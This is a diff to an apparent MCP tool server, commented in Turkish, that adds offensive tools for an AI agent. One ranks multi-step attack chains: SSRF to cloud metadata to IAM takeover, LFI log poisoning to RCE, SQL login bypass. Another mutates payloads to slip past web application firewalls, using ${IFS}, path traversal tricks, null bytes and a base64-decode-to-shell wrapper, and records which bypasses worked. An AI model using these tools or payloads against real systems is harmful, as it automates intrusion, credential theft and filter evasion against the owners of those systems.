@@ -710,5 +710,452 @@ def deep_think(task: str, target: str = "", scope: str = "", context: str = "",
     return json.dumps(out, indent=2, ensure_ascii=False)
 
 
+# ═══════════ Kill-Chain Intelligence — saldırı zinciri kompozisyonu (a) ═══════════
+# Yetenek grafiği: kaynak yetenek → (hedef yetenek, fizibilite, pivot notu). Bulgular
+# giriş yetenekleridir; DFS ile yüksek-impact terminal yeteneklere zincir kurulur.
+CAPABILITY_IMPACT = {
+    "remote_code_execution": 1.0, "webshell": 0.95, "cloud_account_takeover": 1.0,
+    "iam_credentials": 0.9, "data_breach": 0.9, "account_takeover": 0.9,
+    "admin_access": 0.85, "internal_network_access": 0.8, "credential_dump": 0.8,
+    "session_hijack": 0.7, "oauth_token_theft": 0.7, "cloud_metadata_access": 0.6,
+    "authentication_bypass": 0.6, "log_poisoning": 0.5, "ssrf": 0.5,
+}
+CHAIN_RULES = {
+    "ssrf": [("cloud_metadata_access", 0.7, "169.254.169.254 IMDS sorgusu"),
+             ("internal_network_access", 0.5, "iç ağ port taraması / pivot")],
+    "cloud_metadata_access": [("iam_credentials", 0.8, "IMDS role kimlik bilgisi sızıntısı")],
+    "iam_credentials": [("cloud_account_takeover", 0.7, "AWS/GCP API ile kaynak ele geçirme"),
+                        ("data_breach", 0.7, "S3/bucket / storage okuma")],
+    "lfi": [("log_poisoning", 0.6, "access.log'a PHP payload enjeksiyonu"),
+            ("credential_dump", 0.6, "config/.env/secrets okuma")],
+    "log_poisoning": [("remote_code_execution", 0.7, "poisoned log include → kod yürütme")],
+    "path_traversal": [("credential_dump", 0.55, "hassas dosya okuma")],
+    "rfi": [("remote_code_execution", 0.8, "uzak shell include")],
+    "file_upload": [("webshell", 0.7, "yürütülebilir dosya yükleme")],
+    "webshell": [("remote_code_execution", 0.95, "yüklenen shell çağrısı")],
+    "sql_injection": [("credential_dump", 0.8, "users tablosu / hash dump"),
+                      ("authentication_bypass", 0.5, "' OR 1=1 login bypass")],
+    "sql_injection_blind": [("credential_dump", 0.6, "boolean/time-based veri çıkarımı")],
+    "credential_dump": [("admin_access", 0.7, "kırılan hash ile admin login")],
+    "authentication_bypass": [("admin_access", 0.7, "yetkili panel erişimi")],
+    "default_credentials": [("admin_access", 0.85, "varsayılan admin login")],
+    "weak_credentials": [("admin_access", 0.7, "zayıf parola brute/guess")],
+    "admin_access": [("remote_code_execution", 0.6, "admin paneli → dosya/komut yürütme"),
+                     ("data_breach", 0.7, "tüm veriye erişim")],
+    "idor": [("account_takeover", 0.6, "başka kullanıcı kaynağı → ATO"),
+             ("data_breach", 0.6, "yetkisiz veri okuma")],
+    "open_redirect": [("oauth_token_theft", 0.5, "OAuth redirect_uri ile token sızdırma")],
+    "oauth_token_theft": [("account_takeover", 0.8, "çalınan token ile hesap ele geçirme")],
+    "xss_stored": [("session_hijack", 0.7, "kalıcı cookie/oturum çalma")],
+    "xss_reflected": [("session_hijack", 0.5, "kurban cookie çalma")],
+    "xss_dom": [("session_hijack", 0.5, "DOM tabanlı oturum çalma")],
+    "session_hijack": [("account_takeover", 0.8, "çalınan oturumla ATO")],
+    "jwt_attack": [("authentication_bypass", 0.6, "alg=none / zayıf imza → kimlik sahteciliği")],
+    "ssti": [("remote_code_execution", 0.8, "template engine RCE")],
+    "command_injection": [("remote_code_execution", 0.95, "doğrudan komut yürütme")],
+    "rce": [("remote_code_execution", 0.99, "doğrudan kod yürütme")],
+    "xxe": [("ssrf", 0.6, "XXE → iç istek (SSRF pivot)"),
+            ("credential_dump", 0.6, "dosya okuma via XXE")],
+    "deserialization": [("remote_code_execution", 0.7, "gadget chain RCE")],
+    "subdomain_takeover": [("account_takeover", 0.6, "cookie/oauth domain trust kötüye kullanımı")],
+    "cors_misconfiguration": [("data_breach", 0.5, "kimlikli cross-origin veri okuma")],
+}
+CAPABILITY_TOOL = {
+    "cloud_metadata_access": "mcp__kali-tools__interactsh_start (OOB) / curl IMDS",
+    "iam_credentials": "aws/gcloud CLI ile çalınan token doğrulama",
+    "cloud_account_takeover": "bulut API enumeration",
+    "log_poisoning": "manuel curl (User-Agent/log injection)",
+    "webshell": "mcp__kali-tools__generate_exploit_poc",
+    "credential_dump": "mcp__kali-tools__sqlmap_test_structured --dump",
+    "admin_access": "mcp__kali-tools__hydra_attack / manuel login",
+    "session_hijack": "mcp__browser__browser_cookie_audit",
+    "oauth_token_theft": "manuel OAuth akış analizi",
+    "account_takeover": "manuel doğrulama (giriş)",
+    "remote_code_execution": "mcp__kali-tools__generate_exploit_poc",
+    "data_breach": "manuel veri erişim kanıtı",
+    "internal_network_access": "mcp__kali-tools__nmap_scan_structured (pivot)",
+    "ssrf": "mcp__validator__validate_ssrf_oob",
+    "authentication_bypass": "mcp__validator__validate_auth_bypass",
+}
+
+
+def _cap_impact(node: str) -> float:
+    return CAPABILITY_IMPACT.get(node, TECH_IMPACT.get(node, 0.0))
+
+
+def _step_meta(node: str) -> dict:
+    return {
+        "capability": node,
+        "validate_with": VALIDATE_WITH.get(node, ""),
+        "recommended_tool": CAPABILITY_TOOL.get(node, RECOMMENDED_TOOL.get(node, "")),
+        "impact": _cap_impact(node),
+    }
+
+
+def _build_chain(path, edge_feas, notes):
+    entry = path[0]
+    entry_prob, prior_src = _blended_prob(entry)
+    comp = entry_prob
+    for f in edge_feas:
+        comp *= f
+    terminal = path[-1]
+    impact = _cap_impact(terminal)
+    num_edges = len(path) - 1
+    effort = min(0.95, TECH_EFFORT.get(entry, 0.5) + 0.12 * num_edges)
+    ev = round(comp * impact * (1 - 0.4 * effort), 4)
+    steps = []
+    for i, node in enumerate(path):
+        m = _step_meta(node)
+        if i > 0:
+            m["feasibility"] = edge_feas[i - 1]
+            m["pivot_note"] = notes[i - 1]
+        steps.append(m)
+    return {
+        "label": " → ".join(path), "entry": entry, "terminal": terminal,
+        "length": len(path), "composite_prob": round(comp, 4), "impact": impact,
+        "effort": round(effort, 3), "ev": ev, "entry_prior_source": prior_src, "steps": steps,
+    }
+
+
+def _compose_from(entry, max_depth):
+    chains, seen = [], set()
+
+    def dfs(node, path, feas, notes, depth, visited):
+        if len(path) >= 2 and _cap_impact(node) >= 0.6:
+            ch = _build_chain(path, feas, notes)
+            if ch["label"] not in seen:
+                seen.add(ch["label"])
+                chains.append(ch)
+        if depth >= max_depth:
+            return
+        for (tgt, f, note) in CHAIN_RULES.get(node, []):
+            if tgt in visited:
+                continue
+            dfs(tgt, path + [tgt], feas + [f], notes + [note], depth + 1, visited | {tgt})
+
+    dfs(entry, [entry], [], [], 0, {entry})
+    return chains
+
+
+# ═══════════ WAF-aware Payload Evolution — guided mutation (d) ═══════════
+import base64 as _b64
+from urllib.parse import quote as _urlq
+
+
+def _op_case_swap(p): return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p))
+def _op_url_encode(p): return _urlq(p, safe="")
+def _op_double_url_encode(p): return _urlq(_urlq(p, safe=""), safe="")
+def _op_inline_comment(p): return p.replace(" ", "/**/")
+def _op_versioned_comment(p): return re.sub(r"(?i)\b(union|select|from|where)\b", r"/*!50000\1*/", p)
+def _op_whitespace_alt(p): return p.replace(" ", "%0a")
+def _op_keyword_split(p): return re.sub(r"(?i)union", "UNI/**/ON", re.sub(r"(?i)select", "SEL/**/ECT", p))
+def _op_html_entity(p): return p.replace("<", "&lt;").replace(">", "&gt;")
+def _op_js_unicode(p): return "".join("\\u%04x" % ord(c) if c.isalpha() else c for c in p)
+def _op_tag_breakup(p): return p.replace("script", "scr<x>ipt").replace("alert", "al<x>ert")
+def _op_svg_alt(p): return p.replace("<script>", "<svg/onload=").replace("</script>", ">")
+def _op_ifs(p): return p.replace(" ", "${IFS}")
+def _op_quote_insert(p): return re.sub(r"([a-z]{2,})", lambda m: m.group(1)[0] + "''" + m.group(1)[1:], p, count=1)
+def _op_b64_wrap(p): return f"echo {_b64.b64encode(p.encode()).decode()}|base64 -d|sh"
+def _op_dot_alt(p): return p.replace("../", "....//")
+def _op_unicode_slash(p): return p.replace("/", "%c0%af")
+def _op_null_byte(p): return p + "%00"
+
+OPERATORS = {
+    "case_swap": _op_case_swap, "url_encode": _op_url_encode,
+    "double_url_encode": _op_double_url_encode, "inline_comment": _op_inline_comment,
+    "versioned_comment": _op_versioned_comment, "whitespace_alt": _op_whitespace_alt,
+    "keyword_split": _op_keyword_split, "html_entity": _op_html_entity,
+    "js_unicode": _op_js_unicode, "tag_breakup": _op_tag_breakup, "svg_alt": _op_svg_alt,
+    "ifs_sub": _op_ifs, "quote_insert": _op_quote_insert, "b64_wrap": _op_b64_wrap,
+    "dot_alt": _op_dot_alt, "unicode_slash": _op_unicode_slash, "null_byte": _op_null_byte,
+}
+FAMILY_OPS = {
+    "sql_injection": ["inline_comment", "versioned_comment", "keyword_split", "case_swap",
+                      "whitespace_alt", "url_encode", "double_url_encode"],
+    "xss_reflected": ["case_swap", "tag_breakup", "svg_alt", "js_unicode", "html_entity", "url_encode"],
+    "xss_stored": ["case_swap", "tag_breakup", "svg_alt", "js_unicode", "url_encode"],
+    "command_injection": ["ifs_sub", "quote_insert", "b64_wrap", "case_swap", "url_encode"],
+    "path_traversal": ["dot_alt", "url_encode", "double_url_encode", "unicode_slash", "null_byte"],
+    "ssti": ["whitespace_alt", "case_swap", "url_encode"],
+}
+_FAMILY_ALIAS = {
+    "sql_injection_blind": "sql_injection", "rce": "command_injection",
+    "lfi": "path_traversal", "rfi": "path_traversal", "xss_dom": "xss_reflected",
+}
+
+
+def _payload_family(tech): return _FAMILY_ALIAS.get(tech, tech)
+
+
+def _payload_ops_conn():
+    conn = sqlite3.connect(LESSONS_DB)
+    conn.execute("""CREATE TABLE IF NOT EXISTS payload_ops (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, ts TEXT, technique TEXT, operators TEXT,
+        blocked_by TEXT, worked INTEGER)""")
+    return conn
+
+
+def _op_winrate(op, technique):
+    try:
+        conn = _payload_ops_conn()
+        row = conn.execute(
+            "SELECT AVG(worked), COUNT(*) FROM payload_ops WHERE technique=? AND operators LIKE ?",
+            (technique, f"%{op}%")).fetchone()
+        conn.close()
+        if row and row[1]:
+            return float(row[0]), int(row[1])
+    except Exception:
+        pass
+    return None, 0
+
+
+def _fitness(base, variant, ops, technique, blocked_by):
+    if not variant or variant == base:
+        return 0.0
+    diversity = min(1.0, len(ops) / 3.0)
+    signal_break = 0.0
+    toks = [t for t in re.split(r"[^A-Za-z0-9]+", (blocked_by or "")) if len(t) >= 3]
+    if toks:
+        broken = sum(1 for t in toks if t.lower() in base.lower() and t.lower() not in variant.lower())
+        signal_break = min(1.0, broken / len(toks))
+    rates = [r for r in (_op_winrate(o, technique)[0] for o in ops) if r is not None]
+    learned = sum(rates) / len(rates) if rates else 0.0
+    return round(0.45 * diversity + 0.35 * signal_break + 0.20 * learned, 4)
+
+
+# ════════════════════════════ YENİ TOOLS (a + d + e) ════════════════════════════
+
+@mcp.tool()
+def compose_attack_chains(target: str = "", scope: str = "", max_depth: int = 4, top_n: int = 8) -> str:
+    """(a) KILL-CHAIN INTELLIGENCE — memory'deki bulguları deterministik ÇOK-ADIMLI
+    saldırı zincirlerine bağlar (SSRF→IMDS→IAM→bulut ele geçirme, LFI→log poisoning→RCE,
+    open-redirect→OAuth token→hesap ele geçirme...). Her zinciri bileşik olasılık ×
+    yükseltilmiş impact × EV ile sıralar — tek tek orta-seviye bulguları KRİTİK etkiye
+    dönüştürür (büyük ödülleri kazandıran şey). Her adım validator hook'una bağlıdır.
+
+    Args:
+        target: Hedef (memory anahtarı; boşsa tüm bulgular)
+        scope: Scope notu
+        max_depth: Maksimum zincir derinliği (adım)
+        top_n: Döndürülecek en iyi zincir sayısı
+    """
+    actions, findings, endpoints = _candidate_actions(target)
+    entries, seen = [], set()
+    for a in actions:
+        t = a["technique"]
+        if t not in seen:
+            seen.add(t)
+            entries.append(t)
+    all_chains = []
+    for e in entries:
+        all_chains.extend(_compose_from(e, max_depth))
+    all_chains.sort(key=lambda c: c["ev"], reverse=True)
+    top = all_chains[:max(1, int(top_n))]
+    result = {
+        "engine": "deterministic kill-chain composer (capability graph + Bayesian EV)",
+        "target": target or "(tümü)", "scope": scope,
+        "findings_count": len(findings), "entry_techniques": entries,
+        "chains_found": len(all_chains), "ranked_chains": top,
+        "best_chain": top[0] if top else None,
+        "note": "EV = composite_prob × terminal_impact × (1−0.4·effort). composite_prob = "
+                "entry blended_prob × Π(edge feasibility). Tek bulgular zincirlenerek impact yükseltilir.",
+    }
+    if not entries:
+        result["advice"] = ("memory boş — önce recon/exploit yap, store_finding ile kaydet, "
+                            "sonra compose_attack_chains tekrar çağır.")
+    elif not all_chains:
+        result["advice"] = ("Bulgular için bilinen pivot kuralı yok (zaten terminal olabilirler). "
+                            "next_best_action ile devam et.")
+    return json.dumps(result, indent=2, ensure_ascii=False)
+
+
+@mcp.tool()
+def kill_chain_report(chain_json: str) -> str:
+    """(a) Tek bir kill-chain'i (compose_attack_chains'in bir 'ranked_chains' öğesi veya
+    tüm çıktısı) reprodüklenebilir Markdown saldırı anlatısına çevirir: adım adım pivot,
+    her adımın validator komutu, bileşik olasılık/impact/EV. XBOW-tarzı 'validated trace'.
+
+    Args:
+        chain_json: Tek zincir nesnesi veya compose_attack_chains tüm çıktısı (JSON)
+    """
+    try:
+        ch = json.loads(chain_json) if isinstance(chain_json, str) else chain_json
+        if isinstance(ch, dict) and "ranked_chains" in ch:
+            ch = ch.get("best_chain") or (ch.get("ranked_chains") or [{}])[0]
+    except Exception as e:
+        return f"HATA: chain_json parse edilemedi: {e}"
+    if not ch or "steps" not in ch:
+        return "HATA: geçerli bir zincir nesnesi gerekli (steps alanı yok)."
+    L = [f"# 🔗 Kill-Chain: {ch.get('label','?')}", "",
+         f"- **Bileşik başarı olasılığı:** {round(ch.get('composite_prob',0)*100,1)}%",
+         f"- **Terminal impact:** {ch.get('impact')} | **Efor:** {ch.get('effort')} | **EV:** {ch.get('ev')}",
+         f"- **Uzunluk:** {ch.get('length')} adım | **Giriş:** `{ch.get('entry')}` → **Hedef:** `{ch.get('terminal')}`",
+         "", "## Adımlar", "",
+         "| # | Yetenek | Pivot | Fizibilite | Doğrula (validator) | Araç |",
+         "|---|---|---|---|---|---|"]
+    for i, s in enumerate(ch["steps"], 1):
+        pivot = s.get("pivot_note", "— (giriş bulgusu)")
+        feas = f"{int(s.get('feasibility',1.0)*100)}%" if "feasibility" in s else "—"
+        L.append(f"| {i} | `{s['capability']}` | {pivot} | {feas} | "
+                 f"{s.get('validate_with') or '—'} | {s.get('recommended_tool') or '—'} |")
+    L += ["", "## Reprodüksiyon / Doğrulama Sırası", ""]
+    for i, s in enumerate(ch["steps"], 1):
+        vw = s.get("validate_with")
+        L.append(f"{i}. `{s['capability']}` → " +
+                 (f"deterministik doğrula: **{vw}**" if vw
+                  else f"manuel kanıtla ({s.get('recommended_tool') or 'manuel'})"))
+    L += ["", "> Her adımı önce validator ile CONFIRMED yap, sonra bir sonraki pivota geç. "
+          "Zincir = düşük-seviye bulguların KRİTİK etkiye yükseltilmiş, doğrulanabilir kanıtı.", ""]
+    return "\n".join(L)
+
+
+@mcp.tool()
+def evolve_payload(payload: str, technique: str, blocked_by: str = "",
+                   generations: int = 2, population: int = 8) -> str:
+    """(d) WAF-AWARE PAYLOAD EVOLUTION — gözlemlenen bloklara (blocked_by) göre bir
+    payload'ı guided/genetik mutasyonla evrimleştirir (encoding, yorum enjeksiyonu, case,
+    ${IFS}, tag-breakup...). Operatörler tekniğe göre seçilir; record_payload_result ile
+    öğrenilen başarı oranları fitness'a karışır → WAF'a karşı zamanla daha iyi bypass üretir.
+
+    Args:
+        payload: Bloklanan/temel payload
+        technique: Teknik (sql_injection, xss_reflected, command_injection, path_traversal, ssti...)
+        blocked_by: Gözlemlenen blok sinyali (WAF mesajı, filtrelenen token...)
+        generations: Maksimum ardışık dönüşüm derinliği (1-3)
+        population: Döndürülecek en iyi varyant sayısı
+    """
+    tech = _normalize_tech(technique)
+    fam = _payload_family(tech)
+    ops = FAMILY_OPS.get(fam)
+    if not payload or not ops:
+        return json.dumps({
+            "variants": [], "technique": tech, "family": fam,
+            "error": "payload boş veya bu teknik için operatör ailesi yok",
+            "supported": list(FAMILY_OPS.keys()),
+        }, indent=2, ensure_ascii=False)
+    generations = max(1, min(int(generations), 3))
+    candidates, expanded = {}, set()
+
+    def expand(cur, cur_ops, depth):
+        if cur in expanded or len(candidates) >= 1500:
+            return
+        expanded.add(cur)
+        for name in ops:
+            try:
+                nxt = OPERATORS[name](cur)
+            except Exception:
+                continue
+            if not nxt or nxt == cur:
+                continue
+            new_ops = cur_ops + [name]
+            if nxt not in candidates:
+                candidates[nxt] = new_ops
+            if depth + 1 < generations:
+                expand(nxt, new_ops, depth + 1)
+
+    expand(payload, [], 0)
+    scored = [{"payload": v, "operators": o, "fitness": _fitness(payload, v, o, tech, blocked_by)}
+              for v, o in candidates.items()]
+    scored.sort(key=lambda x: x["fitness"], reverse=True)
+    return json.dumps({
+        "engine": "guided mutation (lessons-weighted fitness)",
+        "base_payload": payload, "technique": tech, "family": fam,
+        "blocked_by": blocked_by, "operators_available": ops,
+        "generated": len(scored), "variants": scored[:max(1, int(population))],
+        "note": "Bir varyant işe yarar/yaramazsa record_payload_result ile kaydet → "
+                "operatör win-rate'leri sonraki evrimi yönlendirir.",
+    }, indent=2, ensure_ascii=False)
+
+
+@mcp.tool()
+def record_payload_result(technique: str, operators: str, worked: bool, blocked_by: str = "") -> str:
+    """(d) Bir evrimleşmiş payload'ın sonucunu kaydet → operatör başarı oranlarını öğren.
+    evolve_payload bunları fitness'a karıştırır (WAF'a karşı zamanla akıllanır).
+
+    Args:
+        technique: Teknik
+        operators: Uygulanan operatör adları (virgülle ayrılmış veya JSON liste)
+        worked: Bypass çalıştı mı (True/False)
+        blocked_by: Blok sinyali bağlamı (opsiyonel)
+    """
+    tech = _normalize_tech(technique)
+    if operators.strip().startswith("["):
+        try:
+            ops = ",".join(json.loads(operators))
+        except Exception:
+            ops = operators
+    else:
+        ops = operators
+    try:
+        conn = _payload_ops_conn()
+        conn.execute("INSERT INTO payload_ops (ts, technique, operators, blocked_by, worked) "
+                     "VALUES (?,?,?,?,?)",
+                     (datetime.now(timezone.utc).isoformat(), tech, ops, blocked_by, 1 if worked else 0))
+        conn.commit()
+        conn.close()
+        return json.dumps({"stored": True, "technique": tech, "operators": ops, "worked": worked,
+                           "effect": "evolve_payload bu operatörleri fitness'ta ağırlıklandıracak."},
+                          indent=2, ensure_ascii=False)
+    except Exception as e:
+        return json.dumps({"stored": False, "error": str(e)}, ensure_ascii=False)
+
+
+@mcp.tool()
+def exploitability_score(technique: str, validator_confidence: float = -1.0,
+                         reflexion_verdict: str = "", severity: str = "info",
+                         evidence: str = "") -> str:
+    """(e) KALİBRE SÖMÜRÜLEBİLİRLİK SKORU — validator confidence + reflexion verdict +
+    öğrenilmiş win-rate + kanıt bütünlüğünü TEK kalibre skora (0-1) ve banda
+    (CONFIRMED/LIKELY/POSSIBLE/UNLIKELY) birleştirir. False-positive riskini ve kanıt
+    anlatısını döndürür → 'güven' ticari moat. Deterministik validator varsa o baskındır.
+
+    Args:
+        technique: Zafiyet tekniği
+        validator_confidence: Deterministik validator güveni 0-1 (yoksa -1 bırak)
+        reflexion_verdict: 'APPROVED' | 'REVISE' | '' (reason_reflexion çıktısı)
+        severity: Bulgu severity'si (critical/high/medium/low/info)
+        evidence: Kanıt metni (PoC/yansıma/oracle çıktısı)
+    """
+    tech = _normalize_tech(technique)
+    learned, prior_src = _blended_prob(tech)
+    has_validator = validator_confidence is not None and validator_confidence >= 0
+    verdict = (reflexion_verdict or "").strip().upper()
+    evidence_completeness = min(1.0, len((evidence or "").strip()) / 120.0)
+    signals = {
+        "validator_confidence": validator_confidence if has_validator else None,
+        "reflexion_verdict": verdict or None, "learned_winrate": learned,
+        "prior_source": prior_src, "severity": severity,
+        "evidence_completeness": round(evidence_completeness, 2),
+    }
+    if has_validator:
+        score = float(validator_confidence)
+        score += 0.05 if verdict == "APPROVED" else (-0.10 if verdict == "REVISE" else 0.0)
+        score += 0.05 * (learned - 0.5)
+        score += 0.05 * (evidence_completeness - 0.5)
+        basis = "deterministic-validator-dominant"
+    else:
+        score = 0.55 * learned + 0.15 * (1 if verdict == "APPROVED" else 0) + 0.20 * evidence_completeness
+        score = min(score, 0.65)
+        basis = "no-validator (deterministik doğrulama yok → üst sınır 0.65)"
+    score = round(max(0.0, min(1.0, score)), 3)
+    band = ("CONFIRMED" if score >= 0.9 else "LIKELY" if score >= 0.7
+            else "POSSIBLE" if score >= 0.4 else "UNLIKELY")
+    fp_risk = round(1 - score, 3) if has_validator else round(min(1.0, (1 - score) + 0.15), 3)
+    recommend = (VALIDATE_WITH.get(tech, "mcp__validator__validate_finding")
+                 if (not has_validator or band != "CONFIRMED") else None)
+    narrative = (
+        f"{tech}: skor {score} ({band}). "
+        + (f"Validator güveni {validator_confidence}. " if has_validator
+           else "Deterministik validator YOK → kanıt zayıf, üst sınır LIKELY. ")
+        + (f"Reflexion {verdict}. " if verdict else "")
+        + f"Öğrenilmiş win-rate {learned} ({prior_src}). FP riski {fp_risk}. "
+        + (f"ÖNERİ: {recommend} ile deterministik doğrula." if recommend else "Yayınlanabilir kanıt."))
+    return json.dumps({
+        "technique": tech, "exploitability_score": score, "band": band,
+        "false_positive_risk": fp_risk, "basis": basis, "signals": signals,
+        "recommended_validation": recommend, "evidence_narrative": narrative,
+    }, indent=2, ensure_ascii=False)
+
+
 if __name__ == "__main__":
     mcp.run()
